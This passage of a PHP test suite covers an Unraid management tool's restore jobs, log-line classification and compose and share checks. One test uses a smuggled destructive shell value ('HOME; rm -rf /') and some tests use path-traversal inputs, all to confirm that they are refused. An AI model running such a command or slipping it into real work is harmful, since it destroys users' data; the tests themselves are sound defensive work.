    same('restore: compose files, no path out of the package', [['compose.yaml'], 2], [$nc['compose']['files'], count($nc['files'])]);
    same('restore: templates', ['my-EmbyServer.xml'], $p['apps'][0]['templates']);
    $vm = $p['vms'][0] ?? [];
    same('restore: a VM with its UUID, NVRAM and devices', ['43cd8087-9364-2c3d-eb36-29696480e7d8', ['43cd8087-9364-2c3d-eb36-29696480e7d8_VARS-pure-efi.fd'], 2, false],
        [$vm['uuid'] ?? null, $vm['nvram'] ?? null, $vm['hostdev'] ?? null, $vm['tpm'] ?? null]);
    exec('rm -rf ' . escapeshellarg($tmp));

    $ctx = ['fs' => ['master' => 'zfs', 'disk1' => 'btrfs']];
    same('restore: share paths', [['appdata', 'nextcloud/db', null], ['appdata', 'x', 'master'], null, null, null, ['domains', '', null]],
        [rsSharePath('/mnt/user/appdata/nextcloud/db/', $ctx), rsSharePath('/mnt/master/appdata/x', $ctx), rsSharePath('/mnt/disks/ud/x', $ctx),
         rsSharePath('/mnt/user/appdata/../etc', $ctx), rsSharePath('/mnt/user/.hidden/x', $ctx), rsSharePath('/mnt/user/domains', $ctx)]);
}

/**
 * Mr. Restori restores (steps 2-6): what a dump holds per database, the credentials only as variable names in
 * the container's script, where things go aside (flash, next to it), clean paths, Kopia's list; the job's steps on
 * a temporary folder (aside, put, move, fresh, copy — each recording how «Put back» undoes it) and the put back
 * built from the journal; the engine's lock with his note; a whole job as its own process (done, and refused while
 * the lock is held); interrupted journals; the Dashboard's row. Everything in a temporary folder.
 */
function testRestoreJobs(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-rsjob-' . getmypid();
    @mkdir("$tmp/data/unraid-backup/state", 0700, true);
    $GLOBALS['rs']['data'] = "$tmp/data/restore";
    $GLOBALS['rs']['job_file'] = "$tmp/data/restore-job.json";
    $GLOBALS['rs']['ub_data'] = "$tmp/data/unraid-backup";

    // what a dump holds: tables per database (pg_dumpall's \connect in its forms), complete lines only
    $db = null;
    $count = [];
    rsDumpCount("\\connect template1\nCREATE TABLE x (\n\\connect zztest\nCREATE TABLE public.a (\nCREATE TABLE public.b (\n"
        . "\\connect -reuse-previous=on \"dbname='o''brien'\"\nCREATE TABLE c (\n\\connect \"My \"\"DB\"\"\"\nCREATE TABLE d (\n-- CREATE TABLE not\n", $db, $count);
    same('restore: tables per database from a dump', ['template1' => 1, 'zztest' => 2, "o'brien" => 1, 'My "DB"' => 1], $count);
    file_put_contents("$tmp/d.sql.gz", gzencode(str_repeat("CREATE TABLE t (\n", 3)));
    same('restore: a .gz\'s size from its trailer', 51, rsGzSize("$tmp/d.sql.gz"));
    same('restore: tables of a dump read from the file', ['' => 3], rsDumpTables("$tmp/d.sql.gz"));

    // credentials: only variable names, only known ones; the script never carries a value
    same('restore: Postgres logs in with the package\'s variables', ['login' => 'user', 'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD'],
        rsLogin(['type' => 'postgres', 'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD']));
    same('restore: an unknown variable falls back to the image\'s', 'MARIADB_ROOT_PASSWORD', rsLogin(['type' => 'mariadb', 'login' => 'root', 'password_var' => 'PATH'])['password_var']);
    same('restore: MariaDB as the app\'s user', ['login' => 'user', 'user_var' => 'MARIADB_USER', 'password_var' => 'MARIADB_PASSWORD'],
        rsLogin(['type' => 'mariadb', 'login' => 'user', 'user_var' => 'MARIADB_USER', 'password_var' => 'MARIADB_PASSWORD']));
    $script = rsDbScript('dump', ['type' => 'mariadb', 'login' => 'user', 'user_var' => 'MARIADB_USER', 'password_var' => 'MARIADB_PASSWORD']);
    check('restore: the dump script names variables and takes the database as $1',
        str_contains($script, '-u"$MARIADB_USER" -p"$MARIADB_PASSWORD"') && str_contains($script, '--databases "$1"'), $script);
    check('restore: a fresh cluster is ready over TCP (not the init server on the socket), a running one on the socket',
        str_contains(rsDbScript('ready', ['type' => 'postgres', 'tcp' => true]), '-h 127.0.0.1') && !str_contains(rsDbScript('ready', ['type' => 'postgres']), '-h '));
    check('restore: a database name from the dump never goes to psql -d (a connection string there)',
        str_contains(rsDbScript('tables', ['type' => 'postgres']), 'PGDATABASE="$1"') && !str_contains(rsDbScript('tables', ['type' => 'postgres']), '-d '));
    try {
        rsDbScript('play', ['type' => 'postgres', 'user_var' => 'HOME; rm -rf /', 'password_var' => '']);
        check('restore: a variable not on the list is refused', false);
    } catch (Problem) {
        check('restore: a variable not on the list is refused', true);
    }

    // where what he replaces goes aside
    same('restore: a template aside on the flash', '/x/aside/20261006-120000/plugins/dockerMan/templates-user/my-a.xml',
        rsAsideFor('/boot/config/plugins/dockerMan/templates-user/my-a.xml', '20261006-120000', 'restored-aside', '/x/aside'));
    same('restore: a file outside the flash goes aside next to it', '/mnt/user/appdata/x/compose.yaml.restored-aside-20261006-120000',
        rsAsideFor('/mnt/user/appdata/x/compose.yaml', '20261006-120000'));
    same('restore: clean paths', [true, false, false, false, false], array_map('rsCleanPath', ['/mnt/user/a/b.env', '/mnt/user/../etc', 'rel/x', "/a/b\n", '/a//b']));
    // relative to now, so the test doesn't depend on the time of day it runs
    $recent = date('Ymd-His', time() - 60);
    $future = date('Ymd-His', time() + 3600);
    $old = date('Ymd-His', time() - 2 * 86400);
    same('restore: a stamp from the page only when it is plausible',
        [true, false, false, 15],
        [rsStampOf(['stamp' => $recent]) === $recent, rsStampOf(['stamp' => $future]) === $future,
         rsStampOf(['stamp' => $old]) === $old, strlen(rsStampOf(['stamp' => "$recent\n"]))]);

    // Kopia's list: only real ids, newest first, texts cut
    same('restore: Kopia\'s snapshots', [['abcdef0123456789abcdef0123456789', 2], ['0123456789abcdef0123456789abcdef', 1]],
        array_map(fn ($s) => [$s['id'], $s['files']], rsKopiaParse(json_encode([
            ['id' => '0123456789abcdef0123456789abcdef', 'startTime' => '2026-10-01T01:00:00Z', 'stats' => ['totalSize' => 5, 'fileCount' => 1]],
            ['id' => '../bad', 'startTime' => '2026-10-03T01:00:00Z'],
            ['id' => 'abcdef0123456789abcdef0123456789', 'startTime' => '2026-10-02T01:00:00Z', 'stats' => ['totalSize' => 7, 'fileCount' => 2], 'description' => "uso-backup\n20261002"],
        ]))));

    // templates and compose files: what differs or is missing, a compose file read elsewhere by its unique place
    @mkdir("$tmp/pkg/compose", 0700, true);
    @mkdir("$tmp/pkg/compose-files", 0700, true);
    @mkdir("$tmp/live/tpl", 0700, true);
    @mkdir("$tmp/live/cm/app", 0700, true);
    @mkdir("$tmp/live/share", 0700, true);
    file_put_contents("$tmp/pkg/my-app.xml", 'new');
    file_put_contents("$tmp/live/tpl/my-app.xml", 'old');
    file_put_contents("$tmp/pkg/compose/compose.yaml", 'same');
    file_put_contents("$tmp/live/cm/app/compose.yaml", 'same');
    file_put_contents("$tmp/pkg/compose/.env", 'A=1');
    file_put_contents("$tmp/pkg/compose-files/compose.yaml", 'indirect');
    $pkg = ['path' => "$tmp/pkg", 'templates' => ['my-app.xml'], 'containers' => [],
            'compose' => ['project' => 'app', 'dir' => 'app', 'working_dir' => "$tmp/live/share", 'config_files' => ["$tmp/live/share/compose.yaml"], 'files' => ['compose.yaml', '.env']],
            'files' => [['path' => 'compose-files/compose.yaml'], ['path' => 'compose-files/../x']]];
    $items = rsConfigItems($pkg, "$tmp/live/cm", "$tmp/live/tpl");
    same('restore: templates and compose files compared', [['template', 'differs'], ['compose', 'same'], ['compose', 'missing'], ['compose_file', 'missing']],
        array_map(fn ($i) => [$i['what'], $i['now']], $items));
    $plan = rsPlanConfigFor(['id' => 'app', 'name' => 'app'], $pkg, null, $items, '20261006-120000', "$tmp/flash");
    same('restore: what differs goes aside next to it, the same stays', ['aside', 'put', 'put', 'put'], array_column($plan['steps'], 'do'));
    same('restore: a file aside next to it', "$tmp/live/tpl/my-app.xml.restored-aside-20261006-120000", $plan['steps'][0]['to']);

    // the job's steps on a temporary folder, each with how «Put back» undoes it
    $id = '20261006-120000-ab12';
    rsPrivateDir(rsData());
    rsPrivateDir(rsDir($id));
    $live = "$tmp/live";
    file_put_contents("$live/db.sqlite", 'current');
    chmod("$live/db.sqlite", 0640);
    @mkdir("$tmp/snap/folder/sub", 0700, true);
    file_put_contents("$tmp/snap/folder/sub/f.txt", 'from the snapshot');
    @mkdir("$live/folder", 0755);
    file_put_contents("$live/folder/f.txt", 'live');
    $plan = rsPlanBase('files', 'zz', ['path' => "$live/folder"]);
    $plan['steps'] = [
        ['do' => 'aside', 'path' => "$live/db.sqlite", 'to' => "$live/db.sqlite.aside-20261006-120000", 'optional' => true],
        ['do' => 'aside', 'path' => "$live/db.sqlite-wal", 'to' => "$live/db.sqlite-wal.aside-20261006-120000", 'optional' => true],
        ['do' => 'put', 'from' => "$tmp/pkg/my-app.xml", 'to' => "$live/db.sqlite", 'mode' => 0600],
        ['do' => 'copy', 'from' => "$tmp/snap/folder", 'to' => "$live/folder.restored-20261006-120000"],
        ['do' => 'aside', 'path' => "$live/folder", 'to' => "$live/folder.aside-20261006-120000"],
        ['do' => 'move', 'from' => "$live/folder.restored-20261006-120000", 'to' => "$live/folder"],
        ['do' => 'put', 'from' => "$tmp/pkg/compose/.env", 'to' => "$live/new.env", 'mode' => 0600],
    ];
    $plan['stamp'] = '20261006-120000';
    $j = rsJournalNew($id, $plan);
    $states = [];
    foreach (array_keys($j['steps']) as $i) {
        $j['steps'][$i] = array_merge($j['steps'][$i], rsStep($j, $i));
        $states[] = $j['steps'][$i]['state'];
    }
    same('restore: the steps ran', ['ok', 'skipped', 'ok', 'ok', 'ok', 'ok', 'ok'], $states);
    clearstatcache();
    same('restore: the copy took the old one\'s mode, the old one aside', ['new', 0640, 'current'],
        [file_get_contents("$live/db.sqlite"), fileperms("$live/db.sqlite") & 0777, file_get_contents("$live/db.sqlite.aside-20261006-120000")]);
    same('restore: the folder swapped in, the live one aside', ['from the snapshot', 'live'],
        [@file_get_contents("$live/folder/sub/f.txt"), @file_get_contents("$live/folder.aside-20261006-120000/f.txt")]);
    same('restore: never over something that is there', 'exists', rsStep($j, 2)['note'] ?? null);
    $j['result'] = 'ok';
    writeAtomic(rsDir($id) . '/plan.json', jsonEncode($plan), 0600, 0, 0);
    rsJournalWrite($j);
    same('restore: what was put aside is in the journal (the missing -wal not)', ["$live/db.sqlite", "$live/folder"], array_column($j['aside'], 'from'));

    // «Put back»: from the journal, newest step first; what he restored goes aside itself
    check('restore: it can be put back', rsCanPutback($j));
    $back = rsPlanSeal(rsPlanPutback(['id' => $id], '20261006-130000'), '20261006-130000');
    same('restore: the put back\'s steps', ['aside', 'aside', 'move', 'aside', 'move'], array_column($back['steps'], 'do'));
    same('restore: nothing blocks the put back', [], $back['blockers']);
    $p = rsJournalNew('20261006-130000-cd34', $back);
    rsPrivateDir(rsDir($p['id']));
    $states = [];
    foreach (array_keys($p['steps']) as $i) {
        $p['steps'][$i] = array_merge($p['steps'][$i], rsStep($p, $i));
        $states[] = $p['steps'][$i]['state'];
    }
    same('restore: the put back ran', ['ok', 'ok', 'ok', 'ok', 'ok'], $states);
    clearstatcache();
    same('restore: everything as before, the restored aside', ['current', 'live', 'new', 'from the snapshot', false],
        [@file_get_contents("$live/db.sqlite"), @file_get_contents("$live/folder/f.txt"), @file_get_contents("$live/db.sqlite.putback-20261006-130000"),
         @file_get_contents("$live/folder.putback-20261006-130000/sub/f.txt"), file_exists("$live/new.env")]);
    rsMarkPutback($id, $p['id'], 'ok');
    check('restore: a restore put back can\'t be put back again', !rsCanPutback(rsJournal($id)));

    // the engine's lock: his note while he holds it, the next one finds it busy, the note goes with him
    $h = rsLockTake('zz-app', 'db');
    same('restore: he holds the lock and says so', ['restore', 'zz-app'], [backupLockHolder(rsUbData())['holder'] ?? null, backupLockHolder(rsUbData())['what'] ?? null]);
    $busy = rsLockTake('other', 'db');
    same('restore: a second one finds it busy', 'restore', is_array($busy) ? $busy['holder'] : 'handle');
    same('restore: nothing starts meanwhile', 'restore_busy_restore', rsBusy()['key'] ?? null);
    rsLockRelease($h);
    same('restore: the lock and his note are gone', [null, false], [backupLockHolder(rsUbData()), is_file(rsUbData() . '/state/lock-holder.json')]);

    // a whole job as its own process (php agent.php job restore <id>), and refused while the lock is held
    $run = function (string $jid) use ($tmp): int {
        exec('OFFICE_DATA_DIR=' . escapeshellarg("$tmp/data") . ' ' . escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(OFFICE_DIR . '/agent/agent.php')
            . ' job restore ' . escapeshellarg($jid) . ' 2>&1', $out, $code);
        return $code;
    };
    file_put_contents("$live/one.txt", 'one');
    $plan = rsPlanBase('config', 'zz-job', ['app' => 'zz']);
    $plan['stamp'] = '20261006-140000';
    $plan['steps'] = [['do' => 'aside', 'path' => "$live/one.txt", 'to' => "$live/one.txt.aside-20261006-140000"], ['do' => 'put', 'from' => "$tmp/pkg/my-app.xml", 'to' => "$live/one.txt"]];
    $jid = rsLaunch($plan, false);
    same('restore: a job runs on its own', [0, 'ok', 'new', 'one', false], [$run($jid), rsJournal($jid)['result'] ?? null, @file_get_contents("$live/one.txt"),
        @file_get_contents("$live/one.txt.aside-20261006-140000"), is_file(rsUbData() . '/state/lock-holder.json')]);
    same('restore: a job runs once', 1, $run($jid));
    $h = rsLockTake('someone', 'test');
    $plan['steps'] = [['do' => 'aside', 'path' => "$live/one.txt", 'to' => "$live/one.txt.aside-20261006-150000"]];
    $plan['stamp'] = '20261006-150000';
    $jid = rsLaunch($plan, false);
    same('restore: refused while the lock is held — untouched, exit 75', [75, 'refused', 'restore_busy_restore', true],
        [$run($jid), rsJournal($jid)['result'] ?? null, rsJournal($jid)['reason'] ?? null, is_file("$live/one.txt")]);
    rsLockRelease($h);

    // a journal whose job is gone was interrupted; the Dashboard shows a restore only while its heartbeat is fresh
    $k = rsJournalNew('20261006-160000-ef56', $plan);
    rsPrivateDir(rsDir($k['id']));
    $k['result'] = 'running';
    $k['pid'] = 4194305;
    rsJournalWrite($k, false);
    $rows = array_column(rsJournals(), 'result', 'id');
    same('restore: a job that died is interrupted', 'interrupted', $rows[$k['id']] ?? null);
    require_once OFFICE_DIR . '/src/dashboard.php';
    same('dashboard: Mr. Restori while he restores', [true, false, false],
        [officeDashRestoring(['result' => 'running', 'what' => 'x', 'heartbeat' => 1000], 1100), officeDashRestoring(['result' => 'running', 'what' => 'x', 'heartbeat' => 1000], 2000),
         officeDashRestoring(['result' => 'ok', 'what' => 'x', 'heartbeat' => 1000], 1010)]);

    unset($GLOBALS['rs']['data'], $GLOBALS['rs']['job_file'], $GLOBALS['rs']['ub_data']);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Ms. Protocolli's tour: what counts as an error or a warning (own level,
 * words, what doesn't count), similar lines as one kind, times at the start
 * of a line, reading a file since the last tour (offset, rotation by inode,
 * the cap), the team lead's /var/log check — and that the page colours by
 * the same patterns as the tour counts.
 */
function testLogsTour(): void
{
    $levels = [
        'Oct  5 20:27:28 Tower sshd-session[2940377]: error: connect_to 127.0.0.1 port 18080: failed.' => 'error',
        '2026/10/04 23:21:54 [error] 42368#42368: *817496 open() "/x/question.png" failed (2: No such file)' => 'error',
        't=2026-10-05T22:41:29+02:00 level=info msg="Database locked, sleeping then retrying" error="database is locked"' => '',
        'time="2026-10-05T20:00:00Z" level=warning msg="cleanup failed"' => 'warn',
        '{"level":"warn","ts":1791229645.04,"msg":"HTTP/3 skipped"}' => 'warn',
        '2026-10-04 19:23:53,729 | INFO | Exclude-Liste: 3 Einträge, 0 Fehler' => '',
        '2026-10-04 19:23:53,729 | ERROR | Emby antwortet nicht' => 'error',
        '2026-10-05 21:04:33.953+0000: 268179: error : virNetSocketReadWire:1782 : End of file' => 'error',
        '2026-10-05 20:01:51.778+0000: 268180: warning : qemuDomainObjTaintMsg:5727 : Domain id=12' => 'warn',
        '[11:15:34 WARN VmsService]: Initial hypervisor connection failed: Libvirt is not running.' => 'warn',
        '[05-Oct-2026 08:24:47 Europe/Berlin] PHP Warning:  file_get_contents(x): Failed to open stream' => 'warn',
        '[05-Oct-2026 20:52:44 Europe/Berlin] PHP Parse error:  Unclosed \'{\' on line 378' => 'error',
        '[05-Oct-2026 20:52:44 Europe/Berlin] PHP Deprecated:  something failed' => '',
        '2026-10-05T19:42:42Z INF Retrying connection in up to 2s connIndex=3' => '',
        '2026-10-05T19:42:42Z ERR Connection terminated connIndex=3' => 'error',
        '1:C 05 Oct 2026 20:34:07.634 # WARNING Memory overcommit must be enabled! a background save may fail' => 'warn',
        '[Nest] 218  - 10/05/2026, 9:47:26 PM     LOG Showing log, warn, error, fatal messages' => '',
        '2026-10-05 22:52:38  Check done: 0 errors, 0 warnings, 0 notes.' => '',
        'Imported mempool transactions from file: 45101 succeeded, 0 failed, 0 expired' => '',
        'ENDE: Sat Oct  3 20:42:11 CEST 2026 - Exit Code: 23' => 'error',
        'ENDE: Sat Oct  3 20:42:11 CEST 2026 - Exit Code: 0' => '',
        '>f+++++++++ Season.04/Gossip.Girl.-.S04E14.-.Panic.Roommate.mkv' => '',
        'rsync error: received SIGUSR1 (code 19) at main.c(1622) [generator=3.4.4]' => 'error',
        'kernel: ata3.00: failed command: READ FPDMA QUEUED' => 'error',
        'kernel: BTRFS info (device sdb1): Call Trace: x' => 'error',
        'nginx: [warn] duplicate MIME type "text/html"' => 'warn',
        'Connection timed out while waiting' => 'warn',
        '2026-10-05 22:24:35  WARNUNG: [nextcloud] Verify: 1 Abweichungen' => 'warn',
        'Gather: FEHLER beim Verschieben' => 'error',
        'Started Daily Cleanup of Temporary Directories.' => '',
        'nginx: open() "/var/log/nginx/error.log" for writing' => '',
        '[compose] Pulling images' => '',
    ];
    foreach ($levels as $line => $want) {
        same('logs level: ' . substr($line, 0, 60), $want, logsLevel($line));
    }

    // similar lines are one kind: times, PIDs, connection numbers, addresses, ids don't matter
    $kind = fn (string $l) => logsNormalize($l, logsLineTime($l)[1]);
    same('logs kind: nginx loop', $kind('Oct  4 23:21:47 Tower nginx: 2026/10/04 23:21:47 [error] 42368#42368: *814029 open() "/q.png" failed, client: 192.168.7.61'),
        $kind('Oct  5 01:02:03 Tower nginx: 2026/10/05 01:02:03 [error] 1234#1234: *9 open() "/q.png" failed, client: 10.0.0.2'));
    same('logs kind: container ids and UUIDs', $kind('2026-10-05T20:33:38.694584352Z removing 7f505d74adb07ef9bf9bc20ec4652a38d4daf85a for 9b3e9c65-84b4-2410-470b-8f719c38ea21'),
        $kind('2026-10-06T01:00:00.1Z removing aba6f774f5ad7603936e9b3c6d28853ce5537f2e for 1734176c-cd39-de65-1437-8fe971a30dd6'));
    check('logs kind: another message is another kind', $kind('Oct  5 01:02:03 Tower sshd[1]: error: connect_to 127.0.0.1 port 18080: failed.')
        !== $kind('Oct  5 01:02:03 Tower sshd[1]: Read error from remote host 127.0.0.1 port 18080: Connection reset by peer'));

    // ... nor do file names and paths: quoted, absolute (also with spaces), relative, Samba's "for <name> with NT_STATUS_…"
    $samePairs = [
        'Samba inherit_new_acl' => ['Oct  5 12:00:00 Tower smbd[12]:   open_file_ntcreate: inherit_new_acl failed for Fotos/2024/IMG_0001.jpg with NT_STATUS_ACCESS_DENIED',
                                    'Oct  5 12:30:00 Tower smbd[99]:   open_file_ntcreate: inherit_new_acl failed for Dokumente/Steuer 2025/Beleg Nr. 7.pdf with NT_STATUS_ACCESS_DENIED'],
        'Samba [file]'          => ['Oct  5 12:00:00 Tower smbd[12]:   streams_xattr_pwrite: Write to xattr [user.DosStream.WofCompressedData:$DATA] on file [Windows/System32/fr-FR/wmerror.dll.mui] exceeds maximum',
                                    'Oct  5 12:00:01 Tower smbd[12]:   streams_xattr_pwrite: Write to xattr [user.DosStream.WofCompressedData:$DATA] on file [Windows/SysWOW64/ErrorDetails.dll] exceeds maximum'],
        'quoted path'           => ['Oct  4 23:21:47 Tower nginx: 2026/10/04 23:21:47 [error] 1#1: *1 open() "/usr/local/emhttp/a/question.png" failed (2: No such file or directory), request: "GET /a/question.png HTTP/1.1", referrer: "http://192.168.7.59/Dashboard"',
                                    'Oct  4 23:21:48 Tower nginx: 2026/10/04 23:21:48 [error] 1#1: *2 open() "/usr/local/emhttp/b/c/logo.svg" failed (2: No such file or directory), request: "GET /b/c/logo.svg?v=3 HTTP/1.1", referrer: "http://tower.local/Docker"'],
        'quoted file name'      => ["[05-Oct-2026 08:24:47 Europe/Berlin] PHP Warning:  file_get_contents('state.json'): Failed to open stream",
                                    "[05-Oct-2026 08:24:48 Europe/Berlin] PHP Warning:  file_get_contents('/tmp/other folder/x.json'): Failed to open stream"],
        'absolute path'         => ["Oct  5 03:40:01 Tower move: create_parent: /mnt/master/Serien/Gabby's.Dollhouse.(2019)/Season.04 error: No space left on device",
                                    'Oct  5 03:40:02 Tower move: create_parent: /mnt/master/Serien/Slow.Horses/Season.01 error: No space left on device'],
        'absolute with spaces'  => ['Oct  5 03:40:01 Tower move: move: /mnt/cache/Filme/Der Name der Rose (1986)/Der Name der Rose.mkv No space left on device',
                                    'Oct  5 03:40:02 Tower move: move: /mnt/cache/Serien/Slow.Horses/Season.04/Slow.Horses.-.S04E01.mkv No space left on device'],
    ];
    foreach ($samePairs as $what => [$a, $b]) {
        same("logs kind: $what", $kind($a), $kind($b));
    }
    $otherPairs = [
        'Samba: another status' => ['Oct  5 12:00:00 Tower smbd[12]:   inherit_new_acl failed for a/b.txt with NT_STATUS_ACCESS_DENIED',
                                    'Oct  5 12:00:00 Tower smbd[12]:   inherit_new_acl failed for a/b.txt with NT_STATUS_DISK_FULL'],
        'quoted words'          => ['time="2026-10-05T20:00:00Z" level=warning msg="cleanup failed"', 'time="2026-10-05T20:00:00Z" level=warning msg="restore failed"'],
        'the words after a path' => ['Oct  5 03:40:01 Tower move: create_parent: /mnt/a/b error: No space left on device',
                                    'Oct  5 03:40:01 Tower move: create_parent: /mnt/a/b error: Read-only file system'],
    ];
    foreach ($otherPairs as $what => [$a, $b]) {
        check("logs kind: $what stays apart", $kind($a) !== $kind($b), $kind($a));
    }
    same('logs kind: dates, HTTP/1.1, I/O and a lone slash are no paths', 'on 2026/10/04 via HTTP/1.1: I/O error, files / folders',
        logsNormalizePaths('on 2026/10/04 via HTTP/1.1: I/O error, files / folders'));
    same('logs kind: a quoted message stays', 'msg="Database locked, sleeping then retrying" [error] "HTTP/3 skipped"',
        logsNormalizePaths('msg="Database locked, sleeping then retrying" [error] "HTTP/3 skipped"'));

    // times at the start of a line
    $times = [
        '2026-10-05 20:52:37.064+0000: 268179: error : x' => '2026-10-05 22:52:37',
        '2026-10-05T20:52:37.123456789Z line'             => '2026-10-05 22:52:37',
        '2026-10-05 22:52:15  Backup: started'             => '2026-10-05 22:52:15',
        '2026/10/04 23:21:54 [error] x'                    => '2026-10-04 23:21:54',
        '[Sun Oct  5 22:52:31 2026] usb 1-1: new device'   => '2026-10-05 22:52:31',
        '[05-Oct-2026 18:52:44 UTC] PHP Parse error: x'    => '2026-10-05 20:52:44',
        '[2026/10/05 11:12:13.123456,  0] ../../source3/smbd/server.c:1736(main)' => '2026-10-05 11:12:13',
    ];
    foreach ($times as $line => $want) {
        [$t] = logsLineTime($line);
        same('logs time: ' . substr($line, 0, 30), $want, $t === null ? null : date('Y-m-d H:i:s', $t));
    }
    [$t, $len] = logsLineTime('Oct  5 22:52:00 Tower kernel: x');
    same('logs time: syslog (this year, or last year for December read in January)', [true, 16], [$t !== null && $t <= time() + 86400, $len]);
    same('logs time: none', [null, 0], logsLineTime('rsync error: some files were not transferred'));

    // a sample never ends inside a UTF-8 character
    same('logs cut: whole characters only', ['aaaaaaaaa', true], logsCut(str_repeat('a', 9) . 'ä' . 'bcd', 10));
    same('logs cut: short lines stay', ['abc', false], logsCut('abc', 10));

    // a file since the last tour: from its offset, rotated (the rest of <file>.1, found by inode), the first tour's 24 hours
    $tmp = sys_get_temp_dir() . '/office-tests-logs-' . getmypid();
    @mkdir($tmp, 0700, true);
    $log = "$tmp/syslog";
    $old = date('M j H:i:s', time() - 2 * 86400);
    $new = date('M j H:i:s', time() - 600);
    file_put_contents($log, "$old Tower kernel: I/O error, dev sdb\n$new Tower sshd[1]: error: one\n$new Tower sshd[2]: error: one\n$new Tower ok\n");
    $src = ['group' => 'unraid', 'label' => 'syslog', 'kind' => 'file', 'target' => $log, 'param' => ''];
    $sources = ['syslog' => $src, 'syslog.1' => ['target' => "$log.1"] + $src];
    $mem = [];
    $e = logsTourFileSource('syslog', $src, null, time() - 86400, time() - 86400, $sources, $mem);
    same('logs tour: the first tour counts the last 24 hours, similar lines as one kind', [2, 1, 2, 1],
        [$e['errors'], $e['kinds'], $e['groups'][0]['count'] ?? null, $e['groups'][0]['back'] ?? null]);
    same('logs tour: remembers where the file ended', filesize($log), $mem['syslog']['size'] ?? null);
    file_put_contents($log, "$new Tower smbd[3]: warning: two\n$new Tower half a li", FILE_APPEND);
    $mem2 = [];
    $e = logsTourFileSource('syslog', $src, $mem['syslog'], null, time() - 3600, $sources, $mem2);
    same('logs tour: the next tour reads only what came, whole lines', [0, 1, 1], [$e['errors'], $e['warnings'], $e['lines']]);
    check('logs tour: an unfinished line waits for the next tour', ($mem2['syslog']['size'] ?? PHP_INT_MAX) < filesize($log));
    rename($log, "$log.1");
    file_put_contents("$log.1", "ne\n$new Tower smbd[4]: error: three\n", FILE_APPEND);
    file_put_contents($log, "$new Tower smbd[5]: error: four\n");
    $mem3 = [];
    $e = logsTourFileSource('syslog', $src, $mem2['syslog'], null, time() - 3600, $sources, $mem3);
    $srcs = array_values(array_unique(array_column($e['groups'], 'src')));
    sort($srcs);
    same('logs tour: rotated — the rest of the old file and the new one', [true, 2, ['syslog', 'syslog.1']], [$e['rotated'], $e['errors'], $srcs]);
    file_put_contents($log, str_repeat("$new Tower x: nothing to see\n", 160000), FILE_APPEND);
    $e = logsTourFileSource('syslog', $src, $mem3['syslog'], null, time() - 3600, $sources, $mem);
    same('logs tour: never more than the cap, the newest part', [true, true], [$e['partial'], $e['skipped'] > 0 && $e['lines'] * 30 <= LOGS_TOUR_BYTES]);
    exec('rm -rf ' . escapeshellarg($tmp));

    // the team lead: /var/log over 80 % still to do, over 60 % recommended; a /var/log that isn't a disk of its own: nothing
    $v = fn (int $pct, bool $own = true) => ['ok' => true, 'own' => $own, 'total' => 100 << 20, 'used' => $pct << 20, 'pct' => $pct];
    same('logs check: levels', [['required', true], ['recommended', false], ['required', false], [], []],
        array_map(fn ($c) => $c ? [$c[0]['level'], $c[0]['ok']] : [],
            [logsChecks($v(15)), logsChecks($v(65)), logsChecks($v(85)), logsChecks($v(95, false)), logsChecks(['ok' => false])]));

    // the page colours lines by the same patterns as the tour counts them
    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/logs/desk.js');
    foreach (['OWN_LEVEL' => LOGS_OWN_LEVEL, 'OWN_UPPER' => LOGS_OWN_UPPER, 'NOT_COUNTED' => LOGS_NOT_COUNTED, 'ERROR' => LOGS_ERROR, 'WARN' => LOGS_WARN] as $name => $php) {
        preg_match('#^const ' . $name . ' = /(.*)/[gi]*;$#m', $js, $m);
        same("logs: desk.js $name is the agent's", substr($php, 1, strrpos($php, '/') - 1), $m[1] ?? null);
    }
    preg_match('#const LEVEL_NAMES = \{(.*?)\};#s', $js, $m);
    preg_match_all("#'?([a-z][a-z ]*)'?: '(error|warn|)'#", $m[1] ?? '', $pairs, PREG_SET_ORDER);
    $names = array_column($pairs, 2, 1);
    $want = LOGS_LEVEL_NAMES;
    ksort($names);
    ksort($want);
    same("logs: desk.js LEVEL_NAMES are the agent's", $want, $names);
}

/** Ms. Whereabouts: which services of a compose file build their own image (her rebuild tip) */
function testComposeBuilds(): void
{
    $yaml = "name: x\nservices:\n  db:\n    image: mariadb:11\n    environment:\n      build: no   # an env value, not a key of the service\n"
          . "  app:\n    # Updates: docker compose build --pull\n    image: nextcloud-ocr:\${V}\n    build:\n      context: .\n"
          . "  \"web\":\n    build: ./web\n  cron:\n    image: nextcloud-ocr:\${V}\nnetworks:\n  build:\n    driver: bridge\n";
    same('compose builds: services with build:, nothing else', ['app', 'web'], waComposeBuilds($yaml));
    same('compose builds: none', [], waComposeBuilds("services:\n  a:\n    image: x\n"));
}

/**
 * Ms. Whereabouts on exclusive shares: which shares would become exclusive once
 * «Permit exclusive shares» is on, which can't (a folder on another pool or
 * disk), which Unraid refuses for no reason she can see, and which only their
 * secondary storage keeps from it — from the tour's shares only (fixtures).
 */
function testExclusive(): void
{
    $roots = ['disk1' => ['fs' => 'xfs', 'kind' => 'disk'], 'disk2' => ['fs' => 'xfs', 'kind' => 'disk'],
              'cache' => ['fs' => 'zfs', 'kind' => 'pool'], 'fast' => ['fs' => 'btrfs', 'kind' => 'pool']];
    // shaped like waShares()' storage: use_cache, primary, secondary, exclusive (shares.ini), pools/disks with a top folder
    $share = fn (string $name, string $use, string $primary, ?string $secondary, array $pools, array $disks = [], bool $exclusive = false, bool $missing = false)
        => ['name' => $name, 'storage' => ['use_cache' => $use, 'primary' => $primary, 'secondary' => $secondary, 'exclusive' => $exclusive,
                                           'pools' => $pools, 'disks' => $disks, 'missing' => $missing]];
    $shares = [
        $share('appdata', 'only', 'cache', null, ['cache']),                         // qualifies
        $share('system', 'only', 'cache', null, ['cache'], ['disk1']),               // a folder on disk1 too
        $share('drop', 'only', 'fast', null, ['cache', 'fast']),                     // nostromo's drop: mother + hive
        $share('films', 'yes', 'cache', 'array', ['cache'], ['disk1']),              // cache → array: belongs to the array
        $share('media', 'no', 'array', null, [], ['disk1', 'disk2']),
        $share('tm', 'prefer', 'fast', 'cache', ['cache', 'fast']),                  // pool ← pool, data meant on fast
        $share('vms', 'prefer', 'cache', 'array', ['cache']),                        // pool ← array
